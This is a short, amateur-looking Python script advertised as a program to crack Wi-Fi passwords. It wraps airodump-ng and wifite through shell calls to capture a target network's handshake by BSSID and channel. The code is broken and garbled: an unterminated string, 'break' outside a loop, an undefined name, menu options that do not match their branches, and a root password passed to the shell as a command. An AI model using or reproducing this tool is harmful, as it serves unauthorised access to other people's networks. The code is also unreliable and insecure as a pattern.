from curses.ascii import ctrl

import subprocess

import os

import optparse

print("-------------------Program To Crack Wifi Password---------")

print("\n++++++++++++++++++++++++++++++++++++++++++++++++++++++++")

print("\n\nCrack Password Using Wifite---------->>")

print("\nCrack Password Using Aircrack-ng----->>")

print("[+]For Cracking Wifi Using Wifite Select---------[1]\n")

print("[+]For Cracking Wifi Using Aircrack-ng Select----[2]\n")

a = int(input("Enter Your Option:->>"))

if a == 1:

   print("You Have Selected [1].!!")

   s1 = subprocess.call(["Ifconfig"],shell=True)

   print("Choose Your Wifi Network:-\n\n")

   interface = input("Enter the Wireless Wifi interface:-")

   s2 = subprocess.call(["ifconfig", interface],shell=True)

   print(s2)

   print(["airodump-ng",interface],shell=True)

   ex1 = subprocess.call(["exit", "ctrl^C"],shell=True)

   print(ex1)

   print("Find Bssid of The Network To Hack The Wifi Password in Row Bssid\n")
   
   bssid = input("ENter Bssid Here:- ")
   
   print("Find Channel of The Network To Hack The Wifi Password in Row ch\n")

   channel = int(input("Enter Channel Here:-"))
   
   s3 = subprocess.call(["airodump-ng", interface],shell=True)
   print(s3)
   
   path = input("Enter Path of SToring The Handshake File
              ")
   s4 = subprocess.call(["airodump-ng ","--bssid ", bssid, " --channel ",channel," -w", ])
   
elif a == 2:
   print("Programming code for Wifi Hacking Second Method")
   
   d1 = subprocess.call(["sudo","su"],shell=True)
   
   print(d1)
   
   passwd = input("Enter Password For Root access:-")
   d2 = subprocess.call([passwd],shell=True)
   print(d2)
   
   d3 = subprocess.call([wifite],shell=True)
   print(d3)
   
   print("Press Ctrl^C To stop The Scanning For The wifi Networks.")
   d4 = int(input("Enter Number To select The Network:-"))
   d5 = subprocess.call([d4],shell=True)
   
   print("It will Automatically Exit The Code While Layouting The Password!")
   break
   
else:
   break
